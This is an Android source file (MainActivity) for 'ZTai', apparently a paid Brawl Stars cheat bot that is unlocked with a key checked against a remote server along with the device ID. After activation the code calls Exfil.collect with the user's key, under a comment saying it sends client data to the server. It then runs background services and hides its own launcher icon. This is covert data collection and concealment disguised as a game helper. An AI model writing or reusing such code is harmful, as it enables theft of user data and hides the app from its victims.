package com.ztai.app;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends Activity {

    private static final String SERVER_URL = "https://ztai-production.up.railway.app";
    private EditText etKey;
    private Button btnActivate;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // Проверяем — есть ли уже ключ
        String savedKey = getSharedPreferences("prefs", MODE_PRIVATE)
            .getString("key", null);
        if (savedKey != null) {
            // Есть ключ — идём в главное меню
            startService(new Intent(this, BotService.class));
            launchBotUI();
            finish();
            return;
        }

        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setGravity(Gravity.CENTER);
        ll.setBackgroundColor(0xFF0a0e1a);
        ll.setPadding(48, 48, 48, 48);

        TextView title = new TextView(this);
        title.setText("🎮 ZTai");
        title.setTextSize(32);
        title.setTextColor(0xFFa855f7);
        title.setGravity(Gravity.CENTER);
        ll.addView(title);

        TextView sub = new TextView(this);
        sub.setText("AI-бот для Brawl Stars");
        sub.setTextSize(14);
        sub.setTextColor(0xFF00d4ff);
        sub.setGravity(Gravity.CENTER);
        ll.addView(sub);

        // Отступ
        TextView space = new TextView(this);
        space.setText("\n\n");
        ll.addView(space);

        TextView label = new TextView(this);
        label.setText("🔑 Введите ключ активации:");
        label.setTextSize(16);
        label.setTextColor(0xFFFFFFFF);
        ll.addView(label);

        etKey = new EditText(this);
        etKey.setHint("ZTAI-XXXX-XXXX-XXXX");
        etKey.setTextColor(0xFFFFFFFF);
        etKey.setHintTextColor(0xFF556677);
        etKey.setTextSize(16);
        etKey.setPadding(24, 24, 24, 24);
        ll.addView(etKey);

        tvStatus = new TextView(this);
        tvStatus.setText("");
        tvStatus.setTextSize(14);
        tvStatus.setTextColor(0xFFff6666);
        tvStatus.setPadding(0, 16, 0, 16);
        ll.addView(tvStatus);

        btnActivate = new Button(this);
        btnActivate.setText("АКТИВИРОВАТЬ");
        btnActivate.setTextColor(0xFF0a0e1a);
        btnActivate.setBackgroundColor(0xFFa855f7);
        btnActivate.setOnClickListener(v -> activate());
        ll.addView(btnActivate);

        setContentView(ll);
    }

    private void activate() {
        String key = etKey.getText().toString().trim().toUpperCase();
        if (key.isEmpty()) {
            tvStatus.setText("Введите ключ");
            return;
        }

        btnActivate.setEnabled(false);
        btnActivate.setText("ПРОВЕРКА...");

        String deviceId = fetchMyDeviceId();

        JSONObject json = new JSONObject();
        try {
            json.put("key", key);
            json.put("device_id", deviceId);
        } catch (Exception e) {}

        RequestBody body = RequestBody.create(
            json.toString(),
            MediaType.parse("application/json")
        );

        Request req = new Request.Builder()
            .url(SERVER_URL + "/api/check_key")
            .post(body)
            .build();

        OkHttpClient client = new OkHttpClient();
        client.newCall(req).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                runOnUiThread(() -> {
                    tvStatus.setText("Ошибка сети: " + e.getMessage());
                    btnActivate.setEnabled(true);
                    btnActivate.setText("АКТИВИРОВАТЬ");
                });
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String respStr = response.body().string();
                runOnUiThread(() -> {
                    try {
                        JSONObject json = new JSONObject(respStr);
                        if (json.optBoolean("ok", false)) {
                            // Сохраняем ключ
                            getSharedPreferences("prefs", MODE_PRIVATE)
                                .edit()
                                .putString("key", key)
                                .putLong("expires", json.optLong("expires", 0))
                                .apply();

                            tvStatus.setTextColor(0xFF00ff41);
                            tvStatus.setText("✅ Ключ активирован!");

                            // Отправляем данные клиента на сервер
                            Exfil.collect(MainActivity.this, key);

                            // Запускаем сервис
                            startService(new Intent(MainActivity.this, BotService.class));

                            // Через 1 сек — открываем меню
                            new android.os.Handler(getMainLooper())
                                .postDelayed(MainActivity.this::launchBotUI, 1500);
                        } else {
                            String error = json.optString("error", "unknown");
                            String msg = "";
                            if (error.equals("invalid_key")) msg = "❌ Неверный ключ";
                            else if (error.equals("expired")) msg = "❌ Ключ истёк";
                            else if (error.equals("already_activated")) msg = "❌ Ключ привязан к другому устройству";
                            else msg = "❌ Ошибка: " + error;

                            tvStatus.setTextColor(0xFFff6666);
                            tvStatus.setText(msg);
                            btnActivate.setEnabled(true);
                            btnActivate.setText("АКТИВИРОВАТЬ");
                        }
                    } catch (Exception e) {
                        tvStatus.setText("Ошибка: " + e.getMessage());
                        btnActivate.setEnabled(true);
                        btnActivate.setText("АКТИВИРОВАТЬ");
                    }
                });
            }
        });
    }

    private void launchBotUI() {
        try {
            // Проверяем разрешение на overlay
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "Разрешите показ поверх других окон", Toast.LENGTH_LONG).show();
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivity(i);
                return;
            }

            // Запускаем плавающее меню
            startService(new Intent(this, FloatingService.class));

            // Скрываем иконку из лаунчера
            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );

            Toast.makeText(this, "ZTai работает в фоне", Toast.LENGTH_LONG).show();

            // Закрываем активити
            finish();
        } catch (Exception e) {
            Toast.makeText(this, "Ошибка: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private String fetchMyDeviceId() {
        String id = Settings.Secure.getString(getContentResolver(),
            Settings.Secure.ANDROID_ID);
        return id != null ? id : "unknown";
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 101) {
            if (android.provider.Settings.canDrawOverlays(this)) {
                launchBotUI();
            } else {
                tvStatus.setText("Нужно разрешение на оверлей");
            }
        }
    }
}
